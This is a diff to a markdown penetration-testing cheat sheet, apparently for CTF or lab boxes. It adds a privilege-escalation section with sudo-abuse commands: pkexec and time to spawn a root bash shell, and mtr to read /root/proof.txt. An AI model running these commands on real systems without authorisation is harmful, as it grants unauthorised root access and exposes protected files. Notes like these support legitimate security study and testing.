@@ -3,6 +3,7 @@
 - [BurpSuite](#burp)
 - [Gobuster](#gobuster)
 - [FFUF](#ffuf)
+- [Privilege escalation](#privilege escalation)
 
 - ## Nmap <a name="nmap"></a>
 - ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
@@ -20,3 +21,18 @@
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
   - if you are getting the size same of all use filter size and give the size there.
+ 
+- ## Privilege escalation <a name="privilege escalation"></a>
+- if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
+  - then use the below command it will give you the root privilege
+  - ```sudo pkexec /bin/bash```
+
+- if you find ```/usr/bin/mtr``` in ```sudo -l``` 
+  - then use the below command it will give you the root privilege
+  - ```LFILE=/root/proof.txt```
+  - ```sudo mtr --raw -F "$LFILE"```
+
+- if you find ```/usr/bin/time``` in ```sudo -l``` 
+  - then use the below command it will give you the root privilege
+  - ```sudo /usr/bin/time /bin/bash```
+
